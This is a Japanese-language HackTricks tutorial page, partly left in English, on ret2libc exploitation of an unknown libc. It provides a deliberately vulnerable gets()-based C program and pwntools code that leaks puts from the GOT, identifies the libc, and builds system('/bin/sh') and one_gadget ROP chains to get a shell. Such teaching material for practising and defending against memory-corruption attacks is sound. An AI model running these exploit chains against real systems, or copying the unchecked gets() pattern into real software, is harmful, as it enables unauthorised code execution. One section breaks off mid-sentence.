<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい場合**は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)をフォローする
* **HackTricks**と**HackTricks Cloud**のgithubリポジトリにPRを提出して、あなたのハッキングテクニックを共有する

</details>


# クイックリサーム

1. **オーバーフローのオフセット**を見つける
2. `POP_RDI`、`PUTS_PLT`、`MAIN_PLT`のガジェットを見つける
3. 前述のガジェットを使用して、putsや他のlibc関数のメモリアドレスを**リーク**し、libcバージョンを**見つける**（[ダウンロード](https://libc.blukat.me)）
4. ライブラリを使用して、ROPを計算し、それを悪用する

# 他のチュートリアルと練習用のバイナリ

このチュートリアルでは、このチュートリアルで提案されたコード/バイナリを悪用します：[https://tasteofsecurity.com/security/ret2libc-unknown-libc/](https://tasteofsecurity.com/security/ret2libc-unknown-libc/)\
他の便利なチュートリアル：[https://made0x78.com/bseries-ret2libc/](https://made0x78.com/bseries-ret2libc/)、[https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)

# コード

ファイル名：`vuln.c`
```c
#include <stdio.h>

int main() {
char buffer[32];
puts("Simple ROP.\n");
gets(buffer);

return 0;
}
```

```bash
gcc -o vuln vuln.c -fno-stack-protector  -no-pie
```
# ROP - LIBCアドレス漏洩テンプレート

ここにあるコードを使用して、エクスプロイトを作成します。\
エクスプロイトをダウンロードし、脆弱性のあるバイナリと同じディレクトリに配置し、スクリプトに必要なデータを提供します：

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

# 1- オフセットの検索

エクスプロイトを続行する前に、テンプレートはオフセットが必要です。提供されていない場合、それを見つけるために必要なコードを実行します（デフォルトでは `OFFSET = ""`）。
```bash
###################
### Find offset ###
###################
OFFSET = ""#"A"*72
if OFFSET == "":
gdb.attach(p.pid, "c") #Attach and continue
payload = cyclic(1000)
print(r.clean())
r.sendline(payload)
#x/wx $rsp -- Search for bytes that crashed the application
#cyclic_find(0x6161616b) # Find the offset of those bytes
return
```
**実行** `python template.py` とすると、プログラムがクラッシュした状態で **GDB コンソール** が開かれます。その **GDB コンソール** 内で `x/wx $rsp` を実行して、RIP を上書きするバイトを取得します。最後に、**Python コンソール**を使用して **オフセット**を取得します：
```python
from pwn import *
cyclic_find(0x6161616b)
```
![](<../../../.gitbook/assets/image (140).png>)

オフセット（この場合は40）を見つけたら、その値を使ってテンプレート内のOFFSET変数を変更します。\
`OFFSET = "A" * 40`

別の方法としては、GEFから `pattern create 1000` -- _execute until ret_ -- `pattern seach $rsp` を使用することができます。

# 2- ガジェットの検索

次に、バイナリ内でROPガジェットを見つける必要があります。これらのROPガジェットは、**使用されているlibcを見つけるためにputsを呼び出し、後で** **最終的なエクスプロイトを起動する**のに役立ちます。
```python
PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
```
`PUTS_PLT`を呼び出すためには、**puts関数**が必要です。\
`MAIN_PLT`は、**オーバーフローを再度**利用するために、1回のインタラクション後に**main関数**を再度呼び出すために必要です（無限の利用ラウンド）。**各ROPの最後にプログラムを再度呼び出すために使用されます**。\
**POP\_RDI**は、呼び出される関数に**パラメータ**を**渡す**ために必要です。

このステップでは、実行する必要はありません。すべては実行中にpwntoolsによって見つけられます。

# 3- LIBCライブラリの検索

今は、使用されている**libc**ライブラリのバージョンを見つける時です。そのために、**puts関数**の**メモリ内のアドレス**を**リーク**し、その後そのアドレスにあるputsバージョンがどの**ライブラリバージョン**にあるかを**検索**します。
```python
def get_addr(func_name):
FUNC_GOT = elf.got[func_name]
log.info(func_name + " GOT @ " + hex(FUNC_GOT))
# Create rop chain
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

#Send our rop-chain payload
#p.sendlineafter("dah?", rop1) #Interesting to send in a specific moment
print(p.clean()) # clean socket buffer (read all and print)
p.sendline(rop1)

#Parse leaked address
recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, "\x00"))
log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
#If not libc yet, stop here
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))

return hex(leak)

get_addr("puts") #Search for puts address in memmory to obtains libc base
if libc == "":
print("Find the libc library and continue with the exploit... (https://libc.blukat.me/)")
p.interactive()
```
以下は、実行されたコードの中で最も重要な行です:
```python
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
```
これにより、**RIP** を**上書き**するまでのいくつかのバイトが送信されます: `OFFSET`。\
次に、ガジェット `POP_RDI` の**アドレス**が設定され、次のアドレス (`FUNC_GOT`) が**RDI** レジスタに保存されます。これは、`PUTS_GOT` の**アドレス**をメモリ内の puts 関数のアドレスが `PUTS_GOT` によって指されるアドレスとして**渡す**ためです。\
その後、`PUTS_PLT` が呼び出されます（**RDI** に `PUTS_GOT` が含まれています）ので、puts は `PUTS_GOT` 内の**内容**（**メモリ内の puts 関数のアドレス**）を**読み取り**、それを**出力**します。\
最後に、**main 関数が再度呼び出され**、オーバーフローを再度悪用できます。

この方法で、puts 関数を**だまして**、**puts** 関数の**メモリ内のアドレス**（**libc** ライブラリ内にある）を**出力**させました。そのアドレスがわかったので、**どの libc バージョンが使用されているかを調べる**ことができます。

![](<../../../.gitbook/assets/image (141).png>)

**ローカル**バイナリを**悪用**しているため、**libc** のどのバージョンが使用されているかを特定する必要は**ありません**（`/lib/x86_64-linux-gnu/libc.so.6`内のライブラリを見つければよい）。\
ただし、リモートエクスプロイトの場合は、次に説明する方法で見つけることができます：

## 3.1- libc バージョンの検索（1）

Web ページ [https://libc.blukat.me/](https://libc.blukat.me) で使用されているライブラリを検索できます。\
また、**libc** の発見されたバージョンをダウンロードすることもできます。

![](<../../../.gitbook/assets/image (142).png>)

## 3.2- libc バージョンの検索（2）

次のようにもできます：

* `$ git clone https://github.com/niklasb/libc-database.git`
* `$ cd libc-database`
* `$ ./get`

これには時間がかかるので、お待ちください。\
これを機能させるためには、次のものが必要です：

* Libc シンボル名: `puts`
* リークした libc アドレス: `0x7ff629878690`

最も可能性の高い使用されている**libc**を特定できます。
```
./find puts 0x7ff629878690
ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
archive-glibc (id libc6_2.23-0ubuntu11_amd64)
```
2つのマッチがあります（最初のものが機能しない場合は、2番目のものを試してください）。最初のものをダウンロードしてください：
```
./download libc6_2.23-0ubuntu10_amd64
Getting libc6_2.23-0ubuntu10_amd64
-> Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb
-> Downloading package
-> Extracting package
-> Package saved to libs/libc6_2.23-0ubuntu10_amd64
```
## 3.3- リークするためのその他の関数

`libs/libc6_2.23-0ubuntu10_amd64/libc-2.23.so` から libc を作業ディレクトリにコピーします。
```python
puts
printf
__libc_start_main
read
gets
```
# 4- libcアドレスの特定とexploiting

この時点で、使用されているlibcライブラリを知っているはずです。ローカルバイナリをexploitingしているので、単に次のようにします:`/lib/x86_64-linux-gnu/libc.so.6`

したがって、`template.py`の冒頭で、**libc**変数を次のように変更します：`libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") #Set library path when know it`

**libcライブラリ**への**パス**を指定すると、**exploitの残りは自動的に計算**されます。

`get_addr`関数の中で、**libcのベースアドレス**が計算されます：
```python
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))
```
{% hint style="info" %}
**最終的なlibcベースアドレスは00で終わる必要がある**ことに注意してください。そうでない場合、間違ったライブラリが漏洩している可能性があります。
{% endhint %}

次に、`system`関数へのアドレスと文字列_"/bin/sh"_への**アドレス**は、**libc**の**ベースアドレス**から**計算**され、**与えられたlibcライブラリ**になります。
```python
BINSH = next(libc.search("/bin/sh")) - 64 #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
```
最後に、/bin/sh 実行エクスプロイトが準備され送信される予定です:
```python
rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)

p.clean()
p.sendline(rop2)

#### Interact with the shell #####
p.interactive() #Interact with the conenction
```
Let's explain this final ROP.\
The last ROP (`rop1`) ended calling again the main function, then we can **exploit again** the **overflow** (that's why the `OFFSET` is here again). Then, we want to call `POP_RDI` pointing to the **addres** of _"/bin/sh"_ (`BINSH`) and call **system** function (`SYSTEM`) because the address of _"/bin/sh"_ will be passed as a parameter.\
Finally, the **address of exit function** is **called** so the process **exists nicely** and any alert is generated.

**This way the exploit will execute a **_**/bin/sh**_** shell.**

![](<../../../.gitbook/assets/image (143).png>)

# 4(2)- Using ONE\_GADGET

You could also use [**ONE\_GADGET** ](https://github.com/david942j/one\_gadget)to obtain a shell instead of using **system** and **"/bin/sh". ONE\_GADGET** will find inside the libc library some way to obtain a shell using just one **ROP address**. \
However, normally there are some constrains, the most common ones and easy to avoid are like `[rsp+0x30] == NULL` As you control the values inside the **RSP** you just have to send some more NULL values so the constrain is avoided.

![](<../../../.gitbook/assets/image (615).png>)
```python
ONE_GADGET = libc.address + 0x4526a
rop2 = base + p64(ONE_GADGET) + "\x00"*100
```
# EXPLOIT FILE

この脆弱性を悪用するためのテンプレートはこちらにあります:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

# 一般的な問題

## MAIN\_PLT = elf.symbols\['main'] が見つかりません

"main" シンボルが存在しない場合、mainコードがどこにあるかを確認できます:
```python
objdump -d vuln_binary | grep "\.text"
Disassembly of section .text:
0000000000401080 <.text>:
```
そしてアドレスを手動で設定します：
```python
MAIN_PLT = 0x401080
```
## Putsが見つかりません

バイナリがPutsを使用していない場合は、次のことを確認する必要があります

## `sh: 1: %s%s%s%s%s%s%s%s: not found`

この**エラー**がすべてのエクスプロイトを作成した後に見つかった場合: `sh: 1: %s%s%s%s%s%s%s%s: not found`

"/bin/sh"のアドレスから**64バイトを減算**してみてください:
```python
BINSH = next(libc.search("/bin/sh")) - 64
```
<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションを見つける
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**をフォローする。**
* **ハッキングトリックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **および** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**

</details>
